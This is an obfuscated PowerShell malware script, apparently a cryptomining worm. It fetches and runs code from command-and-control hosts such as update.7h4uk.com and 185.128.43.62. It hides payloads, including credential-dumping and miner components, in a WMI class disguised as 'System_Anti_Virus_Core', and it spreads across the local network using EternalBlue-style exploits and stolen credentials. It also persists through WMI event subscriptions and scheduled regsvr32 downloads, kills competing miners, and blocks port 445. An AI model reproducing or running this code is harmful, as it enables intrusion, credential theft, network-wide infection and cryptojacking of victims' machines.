Remove-Item C:\Windows\SGFpbCBRdWVlbg.txt
$se=@(('u'+'pdate.7h'+'4uk'+'.com'),('185.1'+'28.43.'+'6'+'2'),('info'+'.7'+'h4uk.'+'com'))
$nic=('updat'+'e.7h4uk.co'+'m')
foreach($t in $se)
{
	$pin=TEs`T-C`oNNEcTioN $t
	if ($pin -ne $null)
	{
		$nic=$t
		break
	}
}
$nic=$nic+(':'+'443')

if ((geT`-WmI`ObjECt Win32_OperatingSystem).osarchitecture.contains('32'))
{
	i`EX(NE`W`-oBJE`CT Net.WebClient).DownloadString("http://$nic/antitrojan.ps1")
	return
}

$mimi = $miiiiii
$mon = $mmmmmmm
$funs = $fffffff
$vcp = $cppppppp
$vcr = $crrrrrrr
$sc = $ssssssss

try{
    $StaticClass = N`E`w-obJEcT Management.ManagementClass((('ro'+'ot{0}de'+'f'+'a'+'ult')-F  [cHAR]92), $null,$null)
    $StaticClass.Name = ('Syst'+'em_A'+'nt'+'i_'+'Virus'+'_C'+'ore')
    $StaticClass.Put() | out-N`U`Ll
    $StaticClass.Properties.Add(('m'+'imi') , $mimi)
    $StaticClass.Put() | O`UT`-NUlL
    $StaticClass.Properties.Add(('m'+'on') , $mon)
    $StaticClass.Put() | ou`T-n`ULL
    $StaticClass.Properties.Add(('vc'+'p') , $vcp)
    $StaticClass.Put() | oU`T`-nuLL
    $StaticClass.Properties.Add(('vc'+'r') , $vcr)
    $StaticClass.Put() | O`U`T-null
    $StaticClass.Properties.Add(('fu'+'ns') , $funs)
    $StaticClass.Put() | O`UT`-NULl
    $StaticClass.Properties.Add('sc' , $sc)
    $StaticClass.Put() | o`Ut`-NuLL
    $StaticClass.Properties.Add(('ips'+'u') ," ")
    $StaticClass.Put() | OUt-n`ULl
    $StaticClass.Properties.Add(('i'+'17') ," ")
    $StaticClass.Put() | OUt-N`UlL
    $StaticClass.Properties.Add(('v'+'er'), ('1.'+'5'))
    $StaticClass.Put() | o`Ut-N`Ull
} catch {
    $defun=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($funs))
    i`Ex $defun
		RunDDOS "cohernece.exe"
    $Networks = GET-`wmiOB`j`Ect Win32_NetworkAdapterConfiguration -EA Stop | ? {$_.IPEnabled}
    [byte[]]$sc=[System.Convert]::FromBase64String($sc)
    foreach ($Network in $Networks)
    {
        $IPAddress  = $Network.IpAddress[0]
        if ($IPAddress -match ('^1'+'69.'+'254')){continue}
        $SubnetMask  = $Network.IPSubnet[0]
        $ips_c=Get-networkrange $IPAddress $SubnetMask
        $ips_b=Get-IpInB $IPAddress
        $ips=$ips_c+$ips_b
        $tcpconn = Ne`Tstat -anop tcp
        foreach ($t in $tcpconn)
        {
            $line =$t.split(' ')| ?{$_}
            if (!($line -is [array])){continue}
            if ($line.count -le 4){continue}
            $i=$line[-3].split(':')[0]
            if ( ($line[-2] -eq ('ESTABL'+'ISH'+'ED')) -and  ($i -ne ('1'+'2'+'7.0.0.'+'1')) -and ($ips -notcontains $i))
            {
                $ips+=$i
            }
        }
        #if (([Environment]::TickCount-$stime)/1000 -gt 5400){break}
        foreach ($ip in $ips)
        {
            #if (([Environment]::TickCount-$stime)/1000 -gt 5400){break}
            if ($ip -eq $IPAddress){continue}
						if ((Test-Port $ip) -ne $false -and $ipsu -notcontains $ip)
            {
                $vul=[PingCastle.Scanners.m17sc]::Scan($ip)
                if ($vul -and $i17 -notcontains $ip)
                {
                    $res=E`B7 $ip $sc
                    if (!($res -eq $true))
                    {e`B8 $ip $sc}
                    $i17 = $i17 + " "+$ip
                }
            }
        }
    }
}

$filterName = ('Wi'+'ndow'+'s Eve'+'nts '+'Filt'+'er')
$consumerName = ('Window'+'s Eve'+'nts C'+'on'+'sumer')
$Script=@'
$se=@('update.7h4uk.com','185.128.43.62','info.7h4uk.com')
$nic='update.7h4uk.com'
foreach($t in $se)
{
    $pin=test-connection $t
    if ($pin -ne $null)
    {
        $nic=$t
        break
    }
}
$nic=$nic+(':'+'443')
$ver=(New-Object Net.WebClient).DownloadString("http://$nic/ver.txt").Trim()
if($ver -ne $null){
    $ver_tmp=([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['ver'].Value
    if($ver -ne $ver_tmp){
        IEX (New-Object Net.WebClient).DownloadString("http://$nic/antivirus.ps1")
        return
    }
}
$stime=[Environment]::TickCount
$funs = ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['funs'].Value
$defun=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($funs))
iex $defun

Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.filter -notmatch 'Windows Events'} |Remove-WmiObject
$dirpath=$env:SystemRoot+'\system32'
if  (!(test-path $dirpath )){
	$dirpath=$env:SystemRoot
}
if (!(test-path ($dirpath+'\msvcp120.dll')))

{sentfile ($dirpath+'\msvcp120.dll') 'vcp'}
if (!(test-path ($dirpath+'\msvcr120.dll')))
{sentfile ($dirpath+'\msvcr120.dll') 'vcr'}

[array]$psids= get-process -name powershell |sort cpu -Descending| ForEach-Object {$_.id}
$tcpconn = netstat -anop tcp
$exist=$False
if ($psids -ne $null )
{
    foreach ($t in $tcpconn)
    {
        $line =$t.split(' ')| ?{$_}
        if ($line -eq $null)
        {continue}
        if (($psids[0] -eq $line[-1]) -and $t.contains("ESTABLISHED") -and ($t.contains(":80 ") -or $t.contains(":14444")) )
        {
            $exist=$true
            break
        }
    }
}
RunDDOS "cohernece.exe"
KillBot('System_Anti_Virus_Core')
foreach ($t in $tcpconn)
    {
        $line =$t.split(' ')| ?{$_}
        if (!($line -is [array])){continue}
        if (($line[-3].contains(":3333") -or $line[-3].contains(":5555") -or $line[-3].contains(":7777")) -and $t.contains("ESTABLISHED"))
        {
            $evid=$line[-1]
            Get-Process -id $evid | stop-process -force
        }
    }
if (!$exist -and ($psids.count -le 8))
{
    $cmdmon="powershell -NoP -NonI -W Hidden `"`$mon = ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['mon'].Value;`$funs = ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['funs'].Value ;iex ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(`$funs)));Invoke-Command  -ScriptBlock `$RemoteScriptBlock -ArgumentList @(`$mon, `$mon, 'Void', 0, '', '')`""
    $vbs = New-Object -ComObject WScript.Shell
    $vbs.run($cmdmon,0)
}

$NTLM=$False
$mimi = ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['mimi'].Value
$a, $NTLM= Get-creds $mimi $mimi

$Networks = Get-WmiObject Win32_NetworkAdapterConfiguration -EA Stop | ? {$_.IPEnabled}
$ipsu = ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['ipsu'].Value
$i17 = ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['i17'].Value
$scba= ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['sc'].Value
[byte[]]$sc=[System.Convert]::FromBase64String($scba)
foreach ($Network in $Networks)
{

    $IPAddress  = $Network.IpAddress[0]
	if ($IPAddress -match '^169.254'){continue}
    $SubnetMask  = $Network.IPSubnet[0]
    $ips_c=Get-networkrange $IPAddress $SubnetMask
    $ips_b=Get-IpInB $IPAddress
    $ips=$ips_c+$ips_b
	$tcpconn = netstat -anop tcp
	foreach ($t in $tcpconn)
    {
        $line =$t.split(' ')| ?{$_}
        if (!($line -is [array])){continue}
		if ($line.count -le 4){continue}
		$i=$line[-3].split(':')[0]
        if ( ($line[-2] -eq 'ESTABLISHED') -and  ($i -ne '127.0.0.1') -and ($ips -notcontains $i))
        {
            $ips+=$i
        }
    }
    if (([Environment]::TickCount-$stime)/1000 -gt 5400){break}
    foreach ($ip in $ips)
    {
        if (([Environment]::TickCount-$stime)/1000 -gt 5400){break}
        if ($ip -eq $IPAddress){continue}
				if ((Test-Port $ip) -ne $false -and $ipsu -notcontains $ip)
        {
            $re=0
            if ($a.count -ne 0)
            {$re = test-ip -ip $ip -creds $a  -nic $nic -ntlm $NTLM }
            if ($re -eq 1){$ipsu =$ipsu +" "+$ip}
			else
			{
				$vul=[PingCastle.Scanners.m17sc]::Scan($ip)
				if ($vul -and $i17 -notcontains $ip)

				{
					$res=eb7 $ip $sc
					if (!($res -eq $true))
					{eb8 $ip $sc}
					$i17 = $i17 + " "+$ip
				}
			}
        }
    }
 }

$StaticClass=New-Object Management.ManagementClass('root\default:System_Anti_Virus_Core')
$StaticClass.SetPropertyValue('ipsu' ,$ipsu)
$StaticClass.Put()
$StaticClass.SetPropertyValue('i17' ,$i17)
$StaticClass.Put()
'@
$Scriptbytes  = [System.Text.Encoding]::Unicode.GetBytes($Script)
$EncodedScript=[System.Convert]::ToBase64String($Scriptbytes)

$Query = (('SELECT *'+' FR'+'OM __'+'InstanceM'+'odi'+'fi'+'ca'+'tion'+'Eve'+'nt WITHIN 560'+'0'+' W'+'HER'+'E Targ'+'e'+'t'+'I'+'nsta'+'nce I'+'SA BiAWin3'+'2'+'_'+'Pe'+'rf'+'Form'+'at'+'tedDa'+'ta'+'_'+'PerfOS'+'_Sy'+'stemBiA').rePlACE(([Char]66+[Char]105+[Char]65),[StRIng][Char]39))

geT-`W`MIO`BJeCt -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter ((('__Pat'+'h LIKE'+' 361%'+'Wind'+'ows Even'+'ts Con'+'su'+'mer%'+'36'+'1')).rEplaCE(('3'+'61'),[STriNG][CHAr]39)) | ReMove-`W`miOb`JEcT
GET`-`Wm`IobjEct -Namespace root\Subscription -Class __EventFilter -filter (('nam'+'e= {0}Window'+'s Events Fil'+'te'+'r{0}') -F  [ChAR]39) |r`emoVE-WMI`obJ`e`ct
gEt-`wM`io`BJ`eCT -Namespace root\Subscription -Class CommandLineEventConsumer -Filter ((('Na'+'me=F'+'3oWindows'+' Events'+' Cons'+'um'+'erF'+'3o')).RePLAce(('F'+'3o'),[StRing][cHar]39)) | removE-`W`M`IOBJect

NE`TSh ipsec static add policy name=netbc
Ne`TSH ipsec static add filterlist name=block
n`eTsh ipsec static add filteraction name=block action=block
nE`TSh ipsec static add filter filterlist=block any srcmask=32 srcport=0 dstaddr=me dstport=445 protocol=tcp description=445
NeT`sH ipsec static add rule name=block policy=netbc filterlist=block filteraction=block
net`Sh ipsec static set policy name=netbc assign=y

$FilterParams = @{
        Namespace = (('r'+'ootu'+'7gsubscription')  -CRePLaCE  ([cHAr]117+[cHAr]55+[cHAr]103),[cHAr]92)
        Class = ('_'+'_Ev'+'entFil'+'ter')
        Arguments =@{Name=$filterName;EventNameSpace=(('ro'+'ot'+'DaJcimv2')  -CrePLACE  ([chAr]68+[chAr]97+[chAr]74),[chAr]92);QueryLanguage=('W'+'QL');Query=$Query}
        ErrorAction = ('Si'+'le'+'ntly'+'C'+'ontinue')
    }
$WMIEventFilter = s`Et-`w`miINStan`Ce @FilterParams

$ConsumerParams = @{
        Namespace = (('roo'+'t{0'+'}subscri'+'pt'+'ion')  -f  [chAr]92)
        Class = ('Comma'+'ndL'+'ine'+'E'+'ventCon'+'sumer')
        Arguments =@{ Name = $consumerName; CommandLineTemplate=('po'+'we'+'rsh'+'ell.ex'+'e -NoP '+'-'+'N'+'o'+'nI'+' -W Hid'+'den -'+'E ')+"$EncodedScript"}
        ErrorAction = ('Sil'+'ent'+'lyCont'+'inue')
    }
$WMIEventConsumer = s`Et`-wM`I`inStAnce @ConsumerParams

s`ET-WmiInS`TaNCE -Class __FilterToConsumerBinding -Namespace (('ro'+'otL'+'BEsu'+'bs'+'cripti'+'on').rePLacE('LBE',[StRInG][chaR]92)) -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer} | ouT-N`U`Ll

SCh`T`ASks /create /tn ('Windo'+'wsLo'+'g'+'T'+'asks') /tr ('regsvr32 /'+'u'+' /s /i'+':h'+'ttp'+':'+'//185.'+'128'+'.43.6'+'2/'+'antivirus'+'.'+'ph'+'p sc'+'r'+'obj.'+'dll') /sc onstart /ru ('Syst'+'em') /F
Sch`Ta`sKS /create /tn ('S'+'ystem'+' Log Se'+'curity Ch'+'eck') /tr ('reg'+'svr32 /'+'u /s /i:http'+'://'+'18'+'5'+'.128.43.62/a'+'n'+'tivirus'+'.p'+'hp '+'scrobj.d'+'ll') /sc minute /mo 20 /ru ('Sy'+'s'+'tem') /F
S`chTas`kS /delete /tn yastcat /f
if (tE`sT-p`ATh ($env:SystemRoot+(('1e'+'mt'+'em'+'p1em'+'y1.bat').replaCe(([CHAR]49+[CHAR]101+[CHAR]109),'\')))){r`e`MOve`-Item -Path ($env:SystemRoot+(('Ks'+'ztempK'+'s'+'z'+'y1.bat').REpLaCE(([CHAr]75+[CHAr]115+[CHAr]122),'\')))  -Force}
P`oW`ErcFg /CHANGE -standby-timeout-ac 0
POW`ErC`FG /CHANGE -hibernate-timeout-ac 0
POwe`Rc`Fg -SetAcValueIndex 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 5ca83367-6e45-459f-a27b-476b1d01c936 000

[array]$psids= Get-`prOCe`Ss -name powershell |s`Ort cpu -Descending| F`o`ReA`CH-oBJEcT {$_.id}
$tcpconn = ne`TST`AT -anop tcp
if ($psids -ne $null )
{
    foreach ($t in $tcpconn)
    {
        $line =$t.split(' ')| ?{$_}
        if ($line -eq $null)
        {continue}
        if (($psids[0] -eq $line[-1]) -and $t.contains(('ESTABL'+'ISHE'+'D')) -and ($t.contains((':80'+' ')) -or $t.contains((':14'+'444'))) )
        {
            g`E`T-PROCESS -id $psids[0] | s`TO`P-PRo`cesS -force
            break
        }
    }
}

I`eX $script

